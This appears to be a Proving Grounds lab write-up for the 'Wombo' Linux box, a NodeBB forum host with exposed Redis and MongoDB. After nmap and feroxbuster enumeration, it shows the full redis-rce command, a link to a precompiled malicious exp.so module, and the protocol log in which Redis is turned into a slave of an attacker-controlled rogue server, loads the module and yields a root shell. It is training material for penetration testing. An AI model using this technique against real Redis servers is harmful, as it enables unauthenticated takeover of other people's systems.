---
machine: Wombo
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [nodebb, redis, unauthenticated-rce, mongodb]
date: 2026-08-25
status: retired
summary: A Linux box running a NodeBB forum backed by Redis and MongoDB — testing service enumeration across an exposed forum, key-value store, and document database, then exploitation of an unauthenticated Redis remote-code-execution technique for a direct root shell.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/wombo/nmapscan]
└─$ nmap-full 192.168.245.69
[*] Running fast port discovery on 192.168.245.69...
[sudo] password for kali: 
[*] Open ports: 22,53,80,6379,8080,27017
[*] Running full scan on 192.168.245.69...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 08:50 -0400
Nmap scan report for 192.168.245.69
Host is up (0.058s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
53/tcp    closed domain
80/tcp    open   http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
|_http-title: Home | NodeBB
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=qUl92QWc5_BX_2q0GKGaMlbm; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-Vg2AGHWHFlJsGYZ/u/n5qA6zQ/4"
|     Vary: Accept-Encoding
|     Date: Tue, 25 Aug 2026 12:50:55 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=UHjQWgy3TuzJAMlCVPS_3g83; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-54JDI40S/xN2CZJMLlaWKyx+KVM"
|     Vary: Accept-Encoding
|     Date: Tue, 25 Aug 2026 12:50:54 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Tue, 25 Aug 2026 12:50:54 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
27017/tcp open   mongodb    MongoDB 4.1.1 - 5.0
| mongodb-info: 
|   MongoDB Build info
|     ok = 1.0
|     bits = 64
|     javascriptEngine = mozjs
|     versionArray
|       1 = 0
|       2 = 18
|       3 = 0
|       0 = 4
|     allocator = tcmalloc
|     openssl
|       running = OpenSSL 1.1.0l  10 Sep 2019
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|     storageEngines
|       1 = ephemeralForTest
|       2 = mmapv1
|       3 = wiredTiger
|       0 = devnull
|     version = 4.0.18
|     maxBsonObjectSize = 16777216
|     debug = false
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     modules
|     sysInfo = deprecated
|     buildEnvironment
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       target_arch = x86_64
|       distmod = debian92
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       target_os = linux
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       distarch = x86_64
|   Server status
|     ok = 0.0
|     errmsg = command serverStatus requires authentication
|     codeName = Unauthorized
|_    code = 13
| mongodb-databases: 
|   ok = 0.0
|   errmsg = command listDatabases requires authentication
|   codeName = Unauthorized
|_  code = 13
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.99%I=7%D=8/25%Time=6A8D8FA7%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,3638,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\x20off
SF:\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=b
SF:lock\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-Powere
SF:d-By:\x20NodeBB\r\nset-cookie:\x20_csrf=UHjQWgy3TuzJAMlCVPS_3g83;\x20Pa
SF:th=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x2018181\r\nETag:\x20W/\"4705-54JDI40S/xN2CZJMLlaWKyx\+KVM\"\r\nVary:\
SF:x20Accept-Encoding\r\nDate:\x20Tue,\x2025\x20Aug\x202026\x2012:50:54\x2
SF:0GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang
SF:=\"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>
SF:\r\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=
SF:\"viewport\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3
SF:D;1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html
SF:;\x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capa
SF:ble\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capabl
SF:e\"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\"\x20c
SF:ontent")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Co
SF:ntrol:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\
SF:x20noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x2
SF:01;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-origi
SF:n\r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8-Z
SF:RAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:\x20Tu
SF:e,\x2025\x20Aug\x202026\x2012:50:54\x20GMT\r\nConnection:\x20close\r\n\
SF:r\nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:onnection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1\x2040
SF:4\x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Options:
SF:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferrer-Pol
SF:icy:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeBB\r\ns
SF:et-cookie:\x20_csrf=qUl92QWc5_BX_2q0GKGaMlbm;\x20Path=/\r\nContent-Type
SF::\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nETag:\x
SF:20W/\"2b5a-Vg2AGHWHFlJsGYZ/u/n5qA6zQ/4\"\r\nVary:\x20Accept-Encoding\r\
SF:nDate:\x20Tue,\x2025\x20Aug\x202026\x2012:50:55\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20data-di
SF:r=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\t<titl
SF:e>Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewport\"\
SF:x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\"\x20/
SF:>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20charset=
SF:UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x20cont
SF:ent=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20conten
SF:t=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.73 seconds

```

We see we have several interesting services: a default nginx webapp on port 80, a nodeBB webapp on 8080, a redis store on 6379 and a mongoDB on 27017.

Webapp on 8080 feroxbust:

```text
302      GET        1l        4w       36c http://target:8080/admin => http://target:8080/login?local=1
404      GET        1l        2w        9c http://target:8080/admin~
404      GET        1l        2w        9c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        2w        9c http://target:8080/admin.bak
200      GET        1l        1w       92c http://target:8080/manifest.json
200      GET      238l      587w    11618c http://target:8080/login
302      GET        1l        4w       52c http://target:8080/uploads => http://target:8080/assets/uploads/?v=7sgruj70sic
200      GET      499l     1045w    18970c http://target:8080/categories
200      GET       20l       61w      455c http://target:8080/assets/vendor/jquery/timeago/locales/jquery.timeago.en.js
301      GET       10l       16w      179c http://target:8080/assets => http://target:8080/assets/
302      GET        1l        4w       47c http://target:8080/category/1/ => http://target:8080/category/1/announcements
302      GET        1l        4w       39c http://target:8080/category/3/ => http://target:8080/category/3/blogs
302      GET        1l        4w       51c http://target:8080/category/4/ => http://target:8080/category/4/comments-feedback
200      GET        1l        8w      473c http://target:8080/assets/templates/500.js
200      GET        1l       48w     3255c http://target:8080/api
302      GET        1l        4w       52c http://target:8080/category/2/ => http://target:8080/category/2/general-discussion
200      GET      333l      805w    15539c http://target:8080/category/4/comments-feedback
302      GET        1l        4w       51c http://target:8080/category/4/comments-feedback~ => http://target:8080/category/4/comments-feedback
302      GET        1l        4w       51c http://target:8080/category/4/comments-feedback.bak => http://target:8080/category/4/comments-feedback
302      GET        1l        4w       51c http://target:8080/category/4/comments-feedback.bak2 => http://target:8080/category/4/comments-feedback
302      GET        1l        4w       51c http://target:8080/category/4/comments-feedback.old => http://target:8080/category/4/comments-feedback
302      GET        1l        4w       51c http://target:8080/category/4/comments-feedback.1 => http://target:8080/category/4/comments-feedback
302      GET        1l        4w       51c http://target:8080/category/4/.comments-feedback.swp => http://target:8080/category/4/comments-feedback
302      GET        1l        4w       28c http://target:8080/notifications/ => http://target:8080/login
200      GET      290l      777w    14357c http://target:8080/register
200      GET      333l      785w    15286c http://target:8080/category/3/blogs
200      GET      333l      781w    15439c http://target:8080/category/1/announcements
503      GET      177l      395w     4246c http://target:8080/category/1/announcements~
503      GET      177l      395w     4246c http://target:8080/category/1/announcements.bak
503      GET      177l      395w     4246c http://target:8080/category/1/announcements.bak2
302      GET        1l        4w       47c http://target:8080/category/1/announcements.old => http://target:8080/category/1/announcements
302      GET        1l        4w       47c http://target:8080/category/1/announcements.1 => http://target:8080/category/1/announcements
302      GET        1l        4w       47c http://target:8080/category/1/.announcements.swp => http://target:8080/category/1/announcements
200      GET      333l      807w    15539c http://target:8080/category/2/general-discussion
302      GET        1l        4w       52c http://target:8080/category/2/general-discussion~ => http://target:8080/category/2/general-discussion
200      GET        2l     8041w   478163c http://target:8080/assets/nodebb.min.js
200      GET       16l     4759w   289955c http://target:8080/assets/client.css
200      GET      472l     1006w    18181c http://target:8080/assets/uploads/category/
200      GET      238l      587w    11618c http://target:8080/Login
200      GET      255l      694w    12470c http://target:8080/reset
301      GET       10l       16w      211c http://target:8080/assets/templates/admin => http://target:8080/assets/templates/admin/
301      GET       10l       16w      215c http://target:8080/assets/templates/modules => http://target:8080/assets/templates/modules/
301      GET       10l       16w      207c http://target:8080/assets/images/themes => http://target:8080/assets/images/themes/
301      GET       10l       16w      207c http://target:8080/assets/uploads/files => http://target:8080/assets/uploads/files/
200      GET        1l      123w     5503c http://target:8080/assets/templates/login.js
200      GET        1l      155w     6171c http://target:8080/assets/templates/register.js
301      GET       10l       16w      215c http://target:8080/assets/templates/install => http://target:8080/assets/templates/install/
200      GET        1l      637w    30924c http://target:8080/assets/templates/category.js
200      GET        1l      337w    18914c http://target:8080/assets/templates/search.js
200      GET        1l      289w    15821c http://target:8080/assets/templates/tag.js
301      GET       10l       16w      227c http://target:8080/assets/templates/admin/plugins => http://target:8080/assets/templates/admin/plugins/
301      GET       10l       16w      203c http://target:8080/assets/language/de => http://target:8080/assets/language/de/
301      GET       10l       16w      203c http://target:8080/assets/language/fr => http://target:8080/assets/language/fr/
301      GET       10l       16w      211c http://target:8080/assets/templates/flags => http://target:8080/assets/templates/flags/
301      GET       10l       16w      209c http://target:8080/assets/uploads/system => http://target:8080/assets/uploads/system/
301      GET       10l       16w      215c http://target:8080/assets/templates/account => http://target:8080/assets/templates/account/
200      GET        1l       74w     1078c http://target:8080/assets/language/de/category.json
200      GET        1l       53w     1544c http://target:8080/assets/language/de/search.jso
```

A few of the interesting endpoints are:
- `http://target:8080/login`
- `http://target:8080/reset`
- `http://target:8080/register`

We see that login does not seem to work but we can register an account. We can also confirm that admin is a legitimate existing user from research and the error provided when we attempt to register a new user called 'admin'.

We can run a searchsploit search to see potential relevant exploits:

```bash
┌──(kali㉿kali)-[~/oscp/wombo]
└─$ searchsploit nodebb                  
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Broken Access Control - on NodeBB v3.6.7                                                                                  | multiple/webapps/51930.txt
NodeBB Forum 1.12.2-1.14.2 - Account Takeover                                                                             | multiple/webapps/48875.txt
NodeBB Plugin Emoji 3.2.1 - Arbitrary File Write                                                                          | multiple/webapps/49813.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Foothold

We will attempt to exploit this unauthenticated Redis CVE we find in searchsploit: https://github.com/Ridter/redis-rce

```bash
┌──(kali㉿kali)-[~/oscp/wombo]
└─$ searchsploit redis  
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Redis - Replication Code Execution (Metasploit)                                                                           | linux/remote/48272.rb
Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                                                             | linux/remote/47195.rb
Redis 5.0 - Denial of Service                                                                                             | linux/dos/44908.txt
Redis 8.0.2 - RCE                                                                                                         | linux/remote/52477.py
Redis-cli < 5.0 - Buffer Overflow (PoC)                                                                                   | linux/local/44904.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We still need a malicious `.so` file to execute with this exploit and the link in the aforementioned github is no longer available. We can find a precompiled `.so` here: https://github.com/n0b0dyCN/redis-rogue-server/raw/refs/heads/master/exp.so

We run the exploit on port 80 and select the interactive shell option. This gives us a root shell, no listener needed.

```bash
┌──(kali㉿kali)-[~/oscp/wombo/redis-rce]
└─$ python3 redis-rce.py -r 192.168.245.69 -p 6379 -L 192.168.45.226 -P 80 -v -f exp.so

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.245.69:6379...
[<-] b'*1\r\n$4\r\nINFO\r\n'
[->] b'$3496\r\n# Server\r\nredis_version:5.0.9\r\nredis_git_sha1:00000000\r\nredis_git_dirty:0'......b'sed_cpu_user_children:0.000000\r\n\r\n# Cluster\r\ncluster_enabled:0\r\n\r\n# Keyspace\r\n\r\n'
[*] Sending SLAVEOF command to server
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.45.226\r\n$2\r\n80\r\n'
[->] b'+OK\r\n'
[+] Accepted connection from 192.168.245.69:6379
[*] Setting filename
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[->] b'+OK\r\n'
[+] Accepted connection from 192.168.245.69:6379
[*] Start listening on 192.168.45.226:80
[*] Tring to run payload
[+] Accepted connection from 192.168.245.69:43283
[->] b'*1\r\n$4\r\nPING\r\n'
[<-] b'+PONG\r\n'
[->] b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<-] b'+OK\r\n'
[->] b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<-] b'+OK\r\n'
[->] b'*3\r\n$5\r\nPSYNC\r\n$40\r\ndbc40cd701fc62b1ae78a1e0d6163f262bf51822\r\n$1\r\n1\r\n'
[<-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 0\r\n$44320\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00J\xa6\x00\x00\x00\x00\x00\x00\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[<-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
[->] b'+OK\r\n'
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[->] b'+OK\r\n'
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...
$ whoami 
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$6\r\nwhoami\r\n'
[->] b'$6\r\n\x83root\n\r\n'
root
```

From this shell we can read proof.txt from the root directory and the box is owned.
